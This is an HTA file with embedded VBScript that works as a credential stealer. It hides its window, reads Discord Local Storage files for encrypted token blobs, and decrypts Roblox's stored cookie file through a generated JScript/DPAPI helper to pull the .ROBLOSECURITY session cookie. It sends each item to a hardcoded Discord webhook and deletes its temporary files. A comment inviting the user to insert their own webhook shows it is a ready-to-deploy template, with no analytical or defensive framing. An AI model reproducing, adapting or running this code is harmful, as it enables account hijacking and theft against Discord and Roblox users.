<html><head><title>.</title>
<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
<script language="VBScript">
window.resizeTo 0,0:window.moveTo -2000,-2000
On Error Resume Next

Dim sh, fso, WH, appdata, localappdata, temp
Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' ==========================================
' PUT YOUR WEBHOOK URL HERE (KEEP THE QUOTES)
' ==========================================
WH = "https://discord.com/api/webhooks/1568136262374793286/U6lNQnkvy-NdMd-nOUZQ77wuTTAiFy2SMwMP_kHcPKuKuEw9ERvyGUOHzvRSydAKrqas"

appdata = sh.ExpandEnvironmentStrings("%APPDATA%")
localappdata = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%")
temp = sh.ExpandEnvironmentStrings("%TEMP%")

Call PostEmbed(":satellite: Hit", "PC: " & sh.ExpandEnvironmentStrings("%COMPUTERNAME%"), 3447003)

' 1. Grab Discord Tokens (Text Extraction)
Dim dPath, dFolder, file, raw, rx, matches, m
dPath = appdata & "\discord\Local Storage\leveldb"
If fso.FolderExists(dPath) Then
    Set dFolder = fso.GetFolder(dPath)
    Set rx = CreateObject("VBScript.RegExp")
    rx.Pattern = "dQw4w9WgXcQ:[A-Za-z0-9+/=]+"
    rx.Global = True
    For Each file In dFolder.Files
        If LCase(Right(file.Name, 4)) = ".ldb" Or LCase(Right(file.Name, 4)) = ".log" Then
            Dim f : Set f = fso.OpenTextFile(file.Path, 1, False)
            raw = f.ReadAll
            f.Close
            If InStr(raw, "dQw4w9WgXcQ:") > 0 Then
                Set matches = rx.Execute(raw)
                For Each m In matches
                    Call PostEmbed(":gift: Discord Token Blob", m.Value, 5793266)
                Next
            End If
        End If
    Next
End If

' 2. Decrypt and Grab Roblox Cookie (Native JScript DPAPI)
Dim rPath
rPath = localappdata & "\Roblox\LocalStorage\robloxcookies.dat"
If fso.FileExists(rPath) Then
    Dim f2 : Set f2 = fso.OpenTextFile(rPath, 1, False)
    raw = f2.ReadAll
    f2.Close
    
    ' Extract the base64 blob from the JSON
    Dim b64 : b64 = ""
    If InStr(raw, "CookiesData"":""") > 0 Then
        Dim sp : sp = InStr(raw, "CookiesData"":""") + 14
        Dim ep : ep = InStr(sp, raw, """")
        If ep > sp Then b64 = Mid(raw, sp, ep - sp)
    End If
    
    If Len(b64) > 50 Then
        ' Write the base64 blob to a text file
        Dim tmpIn : tmpIn = temp & "\rbin.txt"
        Dim fIn : Set fIn = fso.CreateTextFile(tmpIn, True)
        fIn.Write b64
        fIn.Close
        
        Dim tmpOut : tmpOut = temp & "\rbout.txt"
        Dim wsfFile : wsfFile = temp & "\x.wsf"
        
        ' Create a WSF file that uses JScript to call DPAPI natively
        Dim wsf : Set wsf = fso.CreateTextFile(wsfFile, True)
        wsf.WriteLine "<job><script language=""JScript"">"
        wsf.WriteLine "var fso = new ActiveXObject('Scripting.FileSystemObject');"
        wsf.WriteLine "var b64 = fso.OpenTextFile('" & tmpIn & "', 1).ReadAll();"
        wsf.WriteLine "var hex = '';"
        wsf.WriteLine "var raw = '';"
        wsf.WriteLine "var objXML = new ActiveXObject('Msxml2.DOMDocument');"
        wsf.WriteLine "var el = objXML.createElement('b');"
        wsf.WriteLine "el.dataType = 'bin.base64';"
        wsf.WriteLine "el.text = b64;"
        wsf.WriteLine "var bytes = el.nodeTypedValue;"
        wsf.WriteLine "var dp = new ActiveXObject('System.Security.Cryptography.ProtectedData');"
        wsf.WriteLine "var dec = dp.Unprotect(bytes, null, 0);"
        wsf.WriteLine "var arr = new Uint8Array(dec);"
        wsf.WriteLine "var str = '';"
        wsf.WriteLine "for (var i=0; i<arr.length; i++) { str += String.fromCharCode(arr[i]); }"
        wsf.WriteLine "fso.CreateTextFile('" & tmpOut & "', true).Write(str);"
        wsf.WriteLine "</script></job>"
        wsf.Close
        
        ' Run the WSF file to decrypt
        sh.Run "wscript.exe """ & wsfFile & """", 0, True
        
        ' Read the decrypted cookie
        If fso.FileExists(tmpOut) Then
            Dim rawDec : rawDec = fso.OpenTextFile(tmpOut, 1).ReadAll
            Dim rx2 : Set rx2 = CreateObject("VBScript.RegExp")
            rx2.Pattern = "\.ROBLOSECURITY\s*=\s*(_[^;\s]+)"
            Dim mDec : Set mDec = rx2.Execute(rawDec)
            If mDec.Count > 0 Then
                Call PostEmbed(":cookie: Roblox Cookie", mDec(0).SubMatches(0), 65280)
            Else
                Call PostEmbed(":cookie: Roblox Cookie", rawDec, 65280)
            End If
        End If
        
        ' Cleanup
        fso.DeleteFile tmpIn, True
        fso.DeleteFile tmpOut, True
        fso.DeleteFile wsfFile, True
    End If
End If

window.close()

Sub PostEmbed(t, d, c)
    Dim DQ: DQ = Chr(34)
    Dim j: j = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & Ej(t) & DQ & "," & DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056
    h.Open "POST", WH, False
    h.SetRequestHeader "Content-Type", "application/json"
    h.Send j
End Sub

Function Ej(s)
    Dim i, c, out
    out = ""
    For i = 1 To Len(s)
        c = Asc(Mid(s, i, 1))
        If c >= 32 Or c = 9 Or c = 10 Or c = 13 Then out = out & Mid(s, i, 1)
    Next
    out = Replace(out, Chr(92), Chr(92) & Chr(92))
    out = Replace(out, Chr(34), Chr(92) & Chr(34))
    out = Replace(out, vbCrLf, Chr(92) & "n")
    out = Replace(out, vbCr, Chr(92) & "n")
    out = Replace(out, vbLf, Chr(92) & "n")
    out = Replace(out, vbTab, Chr(92) & "t")
    Ej = out
End Function
</script>
</head><body></body></html>
